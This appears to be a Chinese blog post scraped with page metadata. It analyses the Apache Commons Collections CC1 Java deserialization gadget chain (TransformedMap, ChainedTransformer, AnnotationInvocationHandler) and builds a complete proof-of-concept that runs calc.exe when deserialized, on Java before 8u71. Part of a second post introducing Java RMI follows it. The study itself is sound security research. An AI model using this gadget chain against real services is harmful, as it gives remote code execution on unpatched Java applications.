transformer ，TransformedMap\n接下来尝试理解他们的设计理念与意图\nTransformer 直译：变形生成器\nJava中的Transformer：是一个在org.apache.commons.collections.Transformer里的接口\n源码\n1 2 3 public interface Transformer { public Object transform(Object input); } 相关接口必须实现transform方法\n作用：从IDEA的注释中可以了解到 将输入对象（保持不变）转换为某个输出对象\n输入输出 参数：输入要转换的对象，应保持不变\n返回值：变换后的对象\n异常处理 如果输入是错误的类，抛出 ClassCastException（运行时）错误 如果输入无效，抛出 IllegalArgumentException（运行时）错误 如果无法完成转换，抛出 FunctorException（运行时）错误 结合输入输出以及注释解释，我们可以有一个基本的概念\nTransformer 差不多应该是一个转换器接口，而且是用来转换对象用的\n如下是实现了该接口的相关类\n我们可以尝试查看几个相关类对于transform方法的具体实现（也是之后可能会用到的Transformer实现类）\nInvokerTransformer 类结构 源码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 public Object transform(Object input) { ... Class cls = input.getClass(); //获取input的Class对象 Method method = cls.getMethod(iMethodName, iParamTypes); //根据Str:iMethodName 和 一系列类型，确定唯一的 Method //iMethodName确定Method名称，iParamTypes确定Method参数类型 //如此设计是为了防止Method重载 return method.invoke(input, iArgs); //执行input类中名为$iMethodName的方法，传入参数$iArgs ... } 核心代码就三行，功能已经注释出来，其中$iArgs，$iParamTypes，$iParamTypes在InvokerTransformer类对象创建的时候确定\n利用角度 所以如果要进行命令执行，达到Runtime.getRuntime().exec(\u0026quot;calc\u0026quot;);的效果的话，转换为InvokerTransformer中transform方法的使用方式是\n1 2 3 4 5 6 7 8 9 public static void main(String[] args) throws Exception { // Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); InvokerTransformer invokerTransformer = new InvokerTransformer( \u0026#34;exec\u0026#34;, new Class[]{String.class}, new String[]{\u0026#34;calc\u0026#34;} ); invokerTransformer.transform(Runtime.getRuntime()); } MapTransformer 类结构 源码 1 2 3 4 public Object transform(Object input) { return iMap.get(input); //从$iMap中拿出key值为$input的value } 利用角度 通过例子了解原理即可，实际使用会结合其他Gadget使用\n1 2 3 4 5 6 7 8 public static void main(String[] args) throws Exception { // Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); HashMap\u0026lt;String,Object\u0026gt; map = new HashMap\u0026lt;\u0026gt;(); map.put(\u0026#34;key\u0026#34;,Runtime.getRuntime()); Transformer transform = MapTransformer.getInstance(map); Runtime runtime = (Runtime) transform.transform(\u0026#34;key\u0026#34;); runtime.exec(\u0026#34;calc\u0026#34;); } ConstantTransformer 类结构 源码 1 2 3 4 public Object transform(Object input) { return iConstant; //不管输入，直接返回对象初始化时确定的值 } 利用角度 没什么利用角度，常数设置器一样的，可能对绕过有帮助？\nChainedTransformer 类结构 源码 1 2 3 4 5 6 7 8 9 10 11 public Object transform(Object object) { for (int i = 0; i \u0026lt; iTransformers.length; i++) { //因为$iTransformers是一个List，所以循环遍历所有$iTransformers中的iTransformer object = iTransformers[i].transform(object); //每一个iTransformer都要运行iTransformer自身的transform方法 //并把结果保存到object中，且object是下个iTransformer.transform方法的参数 } return object; //返回最后一个object } 利用角度 ChainedTransformer的transform方法实现很反直觉，所以其设计缘由值得思考，但目前没找到相关参考资料，按照IDEA中的注释可以解释为：\nFactory method that performs validation and copies the parameter array.\n一个工厂方法，这个方法可以验证和拷贝参数数组 \u0026mdash; （中的内容？）\n此类的利用角度已经曝光多年，不过现在看来还是不得不感叹安全研究员的思维敏锐程度\n如下是简单例子\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 public static void main(String[] args) throws Exception { // Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); Transformer chainedTransformer = new ChainedTransformer( new Transformer[]{ new ConstantTransformer(Runtime.getRuntime()), new InvokerTransformer( \u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc\u0026#34;} ), } ); chainedTransformer.transform(Runtime.class); } 流程示意图 ChainedTransformer也是实现了Transformer接⼝的⼀个类，它的作⽤是将内部的多个Transformer串\n在⼀起。通俗来说就是，前⼀个回调返回的结果，作为后⼀个回调的参数传⼊。\nTransformedMap 类结构 由结构可知，该类只开放了三个方法供外界使用put，putAll，decorate\nTransformedMap.decorate 1 2 3 public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) { return new TransformedMap(map, keyTransformer, valueTransformer); } 构造函数的开放方法\nTransformedMap.put \u0026amp; TransformedMap.putall put\n1 2 3 4 5 public Object put(Object key, Object value) { key = transformKey(key); value = transformValue(value); return getMap().put(key, value); } 可以看到放入key和value的时候会使用transformKey,transformValue对Key和Value进行处理\nputall\n1 2 3 4 public void putAll(Map mapToCopy) { mapToCopy = transformMap(mapToCopy); getMap().putAll(mapToCopy); } 其transformMap源码如下\n1 2 3 4 5 6 7 8 9 10 11 protected Map transformMap(Map map) { Map result = new LinkedMap(map.size()); for (Iterator it = map.entrySet().iterator(); it.hasNext(); ) { Map.Entry entry = (Map.Entry) it.next(); result.put( transformKey(entry.getKey()), transformValue(entry.getValue()) ); } return result; } 可以看到本质还是使用这两个函数进行处理transformKey,transformValue\n1 2 3 4 5 6 7 8 9 10 11 12 13 protected Object transformKey(Object object) { if (keyTransformer == null) { return object; } return keyTransformer.transform(object); } protected Object transformValue(Object object) { if (valueTransformer == null) { return object; } return valueTransformer.transform(object); } 从上面可以看到transformKey,transformValue只是单纯调用transform方法罢了\n整理下来，TransformedMap做了什么事儿？\nTransformedMap这个类构造对象时，会传入Map map, Transformer keyTransformer, Transformer valueTransformer\n构造好后，再向对象中put Key Value时，会使用原先配置好的key/valueTransformer对key/value分别进行处理，将处理后的key/value值放入map中\n如大佬所说\nTransformedMap⽤于对Java标准数据结构Map做⼀个修饰，被修饰过的Map在添加新的元素时，将可\n以执⾏⼀个回调。\nTransformedMap是Map的功能扩展类！！\n简易例子的理解 回到大佬的简易例子\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 public class CommonC1dm { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.getRuntime()), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[] {\u0026#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator\u0026#34;}), }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); outerMap.put(\u0026#34;test\u0026#34;, \u0026#34;xxxx\u0026#34;); } } 首先1-10配置ChainedTransformer，以此放好触发的最终执行环境\n11-13配置TransformedMap，以此触发ChainedTransformer，\n14 放入数据，触发TransformedMap机制。\n完整POC的开端 不过如果只是到这里的话，没法形成完整的利用链路，目前我们的知识点能穿起来的线路如下\nreadObject() \u0026mdash;\u0026gt; \u0026hellip;\u0026hellip;. \u0026mdash;\u0026gt; HashMap \u0026mdash;\u0026gt; TransformedMap \u0026mdash;\u0026gt; ChainedTransformer \u0026mdash;\u0026gt; RCE\n从反序列化入口，到RCE的链路不完整，借用佬的话\n我们前面说过，触发这个漏洞的核心，在于我们需要向Map中加入一个新的元素。在demo中，我们可以手工执行 outerMap.put(\u0026ldquo;test\u0026rdquo;, \u0026ldquo;xxxx\u0026rdquo;); 来触发漏洞，但在实际反序列化时，我们需要找到一个类，它在反序列化的readObject逻辑里有类似的写入操作。这个类就是sun.reflect.annotation.AnnotationInvocationHandler\nAnnotation即注解，大部分情况下，开发者是使用Annotation而不是编写Annotation，所以暂时不做展开学习\nAnnotationInvocationHandler.readObject的源码如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException { s.defaultReadObject(); // Check to make sure that types have not evolved incompatibly AnnotationType annotationType = null; try { annotationType = AnnotationType.getInstance(type); } catch(IllegalArgumentException e) { // Class is no longer an annotation type; time to punch out throw new java.io.InvalidObjectException(\u0026#34;Non-annotation type in annotation serial stream\u0026#34;); } Map\u0026lt;String, Class\u0026lt;?\u0026gt;\u0026gt; memberTypes = annotationType.memberTypes(); // If there are annotation members without values, that // situation is handled by the invoke method. for (Map.Entry\u0026lt;String, Object\u0026gt; memberValue : memberValues.entrySet()) { String name = memberValue.getKey(); Class\u0026lt;?\u0026gt; memberType = memberTypes.get(name); if (memberType != null) { // i.e. member still exists Object value = memberValue.getValue(); if (!(memberType.isInstance(value) || value instanceof ExceptionProxy)) { memberValue.setValue( new AnnotationTypeMismatchExceptionProxy( value.getClass() + \u0026#34;[\u0026#34; + value + \u0026#34;]\u0026#34;).setMember( annotationType.members().get(name))); } } } } } 其中触发语句是26行的memberValue.setValue()，此时的memberValue为AbstractInputCheckedMapDecorator类的静态内部类MapEntry,此类的源码如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 static class MapEntry extends AbstractMapEntryDecorator { /** The parent map */ private final AbstractInputCheckedMapDecorator parent; protected MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent) { super(entry); this.parent = parent; } public Object setValue(Object value) { value = parent.checkSetValue(value); return entry.setValue(value); } } setValue()会调用parent.checkSetValue()，由上方第4行可知parent为AbstractInputCheckedMapDecorator类，即父类\n所以setValue()会调用AbstractInputCheckedMapDecorator类的checkSetValue()方法\n又刚好，TransformedMap是AbstractInputCheckedMapDecorator的抽象类实现，实现了抽象方法checkSetValue()\n有趣的是，TransformedMap.checkSetValue()只在上方提到的内部静态类AbstractInputCheckedMapDecorator.MapEntry中被调用过\nTransformedMap.checkSetValue()的源码如下\n1 2 3 protected Object checkSetValue(Object value) { return valueTransformer.transform(value); } 会调用valueTransformer.transform()，而valueTransformer在简单例子中的第12行已经被设置为触发RCE的transformers了\n所以！！！！！AbstractInputCheckedMapDecorator.MapEntry.parent被设置为TransformedMap即可补齐链条，如下是调用栈。\n1 2 3 4 ChainedTransformer.transform() TransformedMap.checkSetValue() AbstractInputCheckedMapDecorator$MapEntry.setValue() AnnotationInvocationHandler.readObject() 当ChainedTransformer.transform()被调用的时候，即可RCE\n先入为主的解释 初学者的学习阶段只需要理解这样做为什么可行，而暂时搁置为什么一定/需要这样做的原因\nAbstractInputCheckedMapDecorator.MapEntry.parent如何被设置为TransformedMap的呢？\nmemberValues来源于该类的构造函数，构造函数为声明为 1 AnnotationInvocationHandler(Class\u0026lt;? extends Annotation\u0026gt; type, Map\u0026lt;String, Object\u0026gt; memberValues) 所以memberValues是一个实现了Map接口的类，我们设置的outerMap完美符合这个要求\n直接使用构造函数将outerMap传递给memberValues即可\nAnnotationInvocationHandler.readObject()中将memberValues.entrySet()的结果当做迭代器访问，如下 1 for (Map.Entry\u0026lt;String, Object\u0026gt; memberValue : memberValues.entrySet()) 此时memberValues.entrySet()会返回内部类AbstractInputCheckedMapDecorator.EntrySet，如下\n1 2 3 4 5 public Set entrySet() { ... return new EntrySet(map.entrySet(), this); ... } 对内部类AbstractInputCheckedMapDecorator.EntrySet当做迭代器访问时，会触发memberValues.iterator()返回迭代器，AbstractInputCheckedMapDecorator.EntrySet.iterator()源码如下\n1 2 3 public Iterator iterator() { return new EntrySetIterator(collection.iterator(), parent); } 实际上每次返回的迭代器是内部类AbstractInputCheckedMapDecorator.EntrySetIterator，每次迭代器被访问时会访问next()，AbstractInputCheckedMapDecorator.EntrySetIterator.next()源码如下\n1 2 3 4 public Object next() { Map.Entry entry = (Map.Entry) iterator.next(); return new MapEntry(entry, parent); } 每次都会返回内部类AbstractInputCheckedMapDecorator.MapEntry，所以memberValue即AbstractInputCheckedMapDecorator.MapEntry。\n每次memberValue都会访问parent.checkSetValue() \u0026mdash;\u0026gt; 即memberValues.checkSetValue() \u0026mdash;\u0026gt; 即outerMap.checkSetValue() \u0026mdash;\u0026gt; 即TransformedMap.checkSetValue()\n至此，形成RCE链路。\n制作完整POC Demo 简易例子\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 public class CommonC1dm { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.getRuntime()), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[] {\u0026#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator\u0026#34;}), }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); outerMap.put(\u0026#34;test\u0026#34;, \u0026#34;xxxx\u0026#34;); } } 注释掉14行手动触发\n添加代码，构造AnnotationInvocationHandler对象，并将其反序列化，然后手动触发反序列化\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 package org.dm.vulhub.Ser; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.annotation.Annotation; import java.lang.reflect.Constructor; import java.util.HashMap; import java.util.Map; public class CommonC2dm { public static void main(String[] args) throws Exception { //设置ChainedTransformer Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.getRuntime()), new InvokerTransformer( \u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc.exe\u0026#34;}), }; Transformer transformerChain = new ChainedTransformer(transformers); //设置TransformedMap Map innerMap = new HashMap(); // innerMap.put(\u0026#34;value\u0026#34;, \u0026#34;xxxx\u0026#34;); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); //构造AnnotationInvocationHandler Class clazz = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class); construct.setAccessible(true); // Object obj = construct.newInstance(Retention.class, outerMap); Object obj = construct.newInstance(Annotation.class, outerMap); //序列化对象 ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(obj); oos.close(); //手动触发反序列化 ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object obj2 = ois.readObject(); } } 运行发现报错\n构造正确的AnnotationInvocationHandler 1 2 3 4 5 6 //构造AnnotationInvocationHandler Class clazz = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class); construct.setAccessible(true); Object obj = construct.newInstance(Annotation.class, outerMap); 第六行的Annotation.class报错，代表不能随便放入class。Annotation.class来自java.lang.annotation包，所以全局搜索@interface\n搜索@interface是因为这是Annotation.class的继承方式\n有如下几个，所以挑选一个，例如Native.class尝试，报错解决，进入下一个报错\n解决不可反序列化 发现报错\n1 Exception in thread \u0026#34;main\u0026#34; java.io.NotSerializableException: java.lang.Runtime Runtime不支持反序列化，没有实现反序列化接口java.io.Serializable，所以使用反射获取Runtime类对象，于是修改\n1 new ConstantTransformer(Runtime.getRuntime()), 为\n1 2 3 4 5 6 7 8 new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[] { String.class, Class[].class }, new Object[] { \u0026#34;getRuntime\u0026#34;, new Class[0] }), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }), 以获取Runtime示例对象\n此后完整代码如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 package org.dm.vulhub.Ser; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.annotation.Annotation; import java.lang.reflect.Constructor; import java.util.HashMap; import java.util.Map; public class CommonC2dm { public static void main(String[] args) throws Exception { //设置ChainedTransformer Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.getRuntime()), new InvokerTransformer( \u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc.exe\u0026#34;}), }; Transformer transformerChain = new ChainedTransformer(transformers); //设置TransformedMap Map innerMap = new HashMap(); // innerMap.put(\u0026#34;value\u0026#34;, \u0026#34;xxxx\u0026#34;); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); //构造AnnotationInvocationHandler Class clazz = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class); construct.setAccessible(true); // Object obj = construct.newInstance(Retention.class, outerMap); Object obj = construct.newInstance(Annotation.class, outerMap); //序列化对象 ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(obj); oos.close(); //手动触发反序列化 ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object obj2 = ois.readObject(); } } 解决BUG 无法进入for循环 但此时依旧无法触发RCE的执行，为什么，让我们跟踪一下数据执行流\n发现这一行for循环并不能取出值来进入循环\n所以我们需要在memberValues里面，即outerMap里添加键值对来进入循环\n我们发现如果代码在设置TransformedMap这一步里的outermap添加键值对，会直接导致RCE触发，但不是经过反序列化，而是回到了手动触发的方式。\n1 2 3 4 5 //设置TransformedMap Map innerMap = new HashMap(); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); outerMap.put(\u0026#34;aaaaa\u0026#34;, \u0026#34;bbbbb\u0026#34;); 所以我们采用，在innerMap里添加，这样就能保证计算器不会在没有触发反序列化payload的地方出现，如下\n无法进入if判断 如图，即使进入for循环后，还是无法到达memberValue.setValue这条触发语句，memberType需要不为null\nmemberType来源于memberTypes.get(name)，name为str变量，值为aaa，即我们输入的Key值，memberTypes来源于\n1 Map\u0026lt;String, Class\u0026lt;?\u0026gt;\u0026gt; memberTypes = annotationType.memberTypes(); 可以看到在Debug情况下，size=0，即没有从annotationType.memberTypes()中取出有效值。\nannotationType.memberTypes()源码如下\n1 2 3 public Map\u0026lt;String, Class\u0026lt;?\u0026gt;\u0026gt; memberTypes() { return memberTypes; } 直接返回memberTypes，看定义\n1 private final Map\u0026lt;String, Class\u0026lt;?\u0026gt;\u0026gt; memberTypes; final类型，代表只有初始化赋值，查看初始化赋值\n1 2 3 4 5 6 7 8 9 Method[] methods = AccessController.doPrivileged(new PrivilegedAction\u0026lt;Method[]\u0026gt;() { public Method[] run() { // Initialize memberTypes and defaultValues return annotationClass.getDeclaredMethods(); } }); memberTypes = new HashMap\u0026lt;String,Class\u0026lt;?\u0026gt;\u0026gt;(methods.length+1, 1.0f); 来自于methods，methods会去getDeclaredMethods()，获取声明的所有Methods，所以如果类没有声明方法，memberTypes.size始终为0。\n上文搜索到的定义类中，只有Repeatable.class，Retention.class，Target.class具有方法\n所以构造Native.class无法满足条件，换成Repeatable.class试试\n完整源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 package org.dm.vulhub.Ser; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.annotation.Repeatable; import java.lang.reflect.Constructor; import java.util.HashMap; import java.util.Map; public class CommonC2dm { public static void main(String[] args) throws Exception { //设置ChainedTransformer Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[] { String.class, Class[].class }, new Object[] { \u0026#34;getRuntime\u0026#34;, new Class[0] }), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer( \u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc.exe\u0026#34;}), }; Transformer transformerChain = new ChainedTransformer(transformers); //设置TransformedMap Map innerMap = new HashMap(); innerMap.put(\u0026#34;aaaaa\u0026#34;, \u0026#34;bbbbb\u0026#34;); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); //构造AnnotationInvocationHandler Class clazz = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class); construct.setAccessible(true); // Object obj = construct.newInstance(Retention.class, outerMap); Object obj = construct.newInstance(Repeatable.class, outerMap); //序列化对象 ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(obj); oos.close(); //手动触发反序列化 ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object obj2 = ois.readObject(); } } 发现还是无法进入if语句，因为取值的时候，没有Key值为aaa的选项，所以将aaa改为value试试\n成功触发\n完整POC Demo 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 package org.dm.vulhub.Ser; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.annotation.Repeatable; import java.lang.reflect.Constructor; import java.util.HashMap; import java.util.Map; public class CommonC2dm { public static void main(String[] args) throws Exception { //设置ChainedTransformer Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[] { String.class, Class[].class }, new Object[] { \u0026#34;getRuntime\u0026#34;, new Class[0] }), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer( \u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc.exe\u0026#34;}), }; Transformer transformerChain = new ChainedTransformer(transformers); //设置TransformedMap Map innerMap = new HashMap(); innerMap.put(\u0026#34;value\u0026#34;, \u0026#34;bbbbb\u0026#34;); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); //构造AnnotationInvocationHandler Class clazz = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class); construct.setAccessible(true); // Object obj = construct.newInstance(Retention.class, outerMap); Object obj = construct.newInstance(Repeatable.class, outerMap); //序列化对象 ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(obj); oos.close(); //手动触发反序列化 ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object obj2 = ois.readObject(); } } 缺陷-Java高版本无法利用 大佬说\n我们是在Java 8u71以前的版本上进行测试的，在8u71以后大概是2015年12月的时候，Java官方修改了 sun.reflect.annotation.AnnotationInvocationHandler 的readObject函数\n修改后，我们精心构造的outerMap不会再有set，put操作，就不会触发transform()，自然也就失效了\n如何破局 仔细对比ysoserial中的CC1和我们的CC1 Demo大有不同，我们将在下一章进行知识的补充与学习\n","date":"2024-07-21T15:58:24+08:00","image":"https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20240721160313033.png","permalink":"https://d4n-sec.github.io/p/cc1demo/","title":"CC1Demo"},{"content":"什么是RMI RMI (Remote Method Invocation) 模型是一种分布式对象应用，使用 RMI 技术可以使一个 JVM 中的对象，调用另一个 JVM 中的对象方法并获取调用结果。这里的另一个 JVM 可以在同一台计算机也可以是远程计算机。因此，RMI 意味着需要一个 Server 端和一个 Client 端。\nServer 端通常会创建一个对象，并使之可以被远程访问。\n这个对象被称为远程对象。Server 端需要注册这个对象可以被 Client 远程访问。\nClient 端调用可以被远程访问的对象上的方法，Client 端就可以和 Server 端进行通信并相互传递信息。\nRMI 在构建一个分布式应用时十分方便，它和 RPC 一样可以实现分布式应用之间的互相通信，甚至和现在的微服务思想都十分类似。\nRMI (Remote Method Invocation) 分布式对象应用的设计可以方便项目的解耦，和微服务，RPC相关思想如出一辙。\nRMI和RPC的不同点呢？\nRPC是一种思想，一种类似协议的约定，只要是通过网络从而调有远端的某种服务，那么这就是RPC\nRMI可以说是Java对RPC的具体实现，或说RMI是RPC的java版的细化要求\nJava中所有东西皆是对象，所以没有函数，只有方法（绑定了对象）所以RPC的解释是面向过程的，RMI的解释是面向对象的\n不管是何种实现，本质都是为了解决一个问题：我想要调用远程的一个函数或者方法或者其他什么东西的时候，我只需要像调用本地的一样，即可。\n知识补充 补充：RPC？\nRPC是远程过程调用（Remote Procedure Call） RPC 的主要功能目标是让构建分布式计算（应用）更容易，在提供强大的远程调用能力时不损失本地调用的语义简洁性。为实现该目标，RPC 框架需提供一种透明调用机制，让使用者不必显式的区分本地调用和远程调用。\nRPC的出现可以使得程序直接像调用本地函数一样调用远程的方法，如果调用远程方法时设计到的传入参数是一个实例化对象，那么就会涉及到序列化与反序列化。\n比如需要将Apple a 中的 name 成员变量提取处理后返回处理后的Apple a1\n一次完整的RPC逻辑\n到此，完整的rpc逻辑应该就是这样的：\nclient进行connect连接 （创建连接，如果需要可靠第一，就选择TCP连接） client序列化req（否则无法传输） client根据约定的协议编码，向server发送编码后的数据（编码是为了防止传输出错） server接收到数据，解码得到方法名和序列化过后的req二进制流 server根据方法名找到req的类型，反序列化得到req对象 server调用本地方法得到res server序列化res server根据约定的协议编码并发送数据 client接收到数据并解码 client反序列化得到res RPC的目标就是将这些步骤都封装起来，让用户对这些细节透明，用户只知道调用的输入，并最后处理输出即可\nRMI是怎么设计的 RMI 中是通过在客户端的Stub对象作为远程接口进行远程方法的调用。 每个远程方法都具有方法签名。 如果一个方法在服务器上执行，但是没有相匹配的签名被添加到这个远程接口(stub)上，那么这个新方法就不能被RMI客户方所调用。\n基本流程图：\n从图中可以看到，Client 端有一个被称 Stub 的东西，有时也会被成为存根，它是 RMI Client 的代理对象，Stub 的主要功能是请求远程方法时构造一个信息块，RMI 协议会把这个信息块发送给 Server 端。\n这里可以了解到的东西\nClient被Stub（存根）代理，所以 Client 眼中只有 Stub。即相对于Client，具体实现细节被Stub隐藏。 Stub 会请求远程方法，并在这时发送一个信息块 信息块是Stub构造的 这个信息块由几个部分组成：\n远程对象标识符。 调用的方法描述。 编组后的参数值（RMI协议中使用的是对象序列化） 尝试理解这个信息块的话，信息块内容的作用分别为\n尝试指定一个唯一的对象 指定唯一方法 传递参数（参数如果是对象的话 \u0026ndash; 其实JAVA里万物皆对象 \u0026ndash; 需要序列化对象） 如果在本地调用的话容易实现，远程调用就需要指定唯一性\n1 2 3 4 随学的疑问？ 1. 可以指定静态类吗？ 2. 一定要确定是某一个对象才可以吗 3. 如果2成立，是由于该对象特殊？是因为他注册了?（设置了可以对外） 2和3的解答\n既然 Client 端有一个 Stub 可以构造信息块发送给 Server 端，那么 Server 端必定会有一个接收这个信息快的对象，称为 Skeleton\n它主要的工作是：\n解析信息快中的调用对象标识符和方法描述，在 Server 端调用具体的对象方法。 取得调用的返回值或者异常值。 把返回值进行编组，返回给客户端 Stub. 这里可以了解到的东西\nServer端有一个接受信息块的东西称之为 Skeleton Skeleton 也可能是作为Server端的代理，对Server隐藏实现细节 Skeleton 获得信息块后，取出值交给Server端，并从Server端获得结果（可能是返回值，异常值） Skeleton 对相关结果进行 编码 发送回Client端 所以，RMI的整个工作流程即为\nRMI工作流程 首先，服务器创建一个远程对象并将其注册到注册表中（注册表中写入Stub） 客户端可以获取注册表中存储的对象的引用（Stub） 当客户端调用远程对象的方法时，实际上会在与客户端 JVM 在同一 JVM 中的存根对象（Stub）上调用该方法。 存根对象（Stub）会创建一条消息，其中包含方法的名称以及其参数（称为封装），并将此消息发送到位于服务器 JVM 中的相关骨架对象（Skeleton）。 骨架对象（Skeleton）会从消息中提取方法名和参数（称为解封装），并调用与其关联的远程对象上的适当方法。 远程对象执行该方法并将返回值传回骨架对象（Skeleton）。 骨架对象（Skeleton）再将返回值封装在消息中并将此消息发送到存根对象（Stub）。 存根对象（Stub）从消息中解封装返回值，并将该值返回给客户端程序 看到这里有读者或许会有疑惑：Stub不是在Client端的吗，为什么和服务器沾边了？\nStub是Client使用，但是是由Server端创建的，Client 在第一次尝试远程调用前需要通过网络在注册表中取出Stub，之后的再次使用就可以不再重复此过程，直接使用本地已经获取的Stub即可\n注意：解答中的Stub可复用的前提是Client端只需要远程调用一个对象，如果需要调用多个不同类对象的话，每个类对象在第一次调用前需要获得Stub\n相关术语总结\nRMIRegistry RMI注册表，RMIServer负责将stubs（存根）注册到RMIRegistry，RMIClient从RMIRegistry获取stubs（存根）。 RMIServer 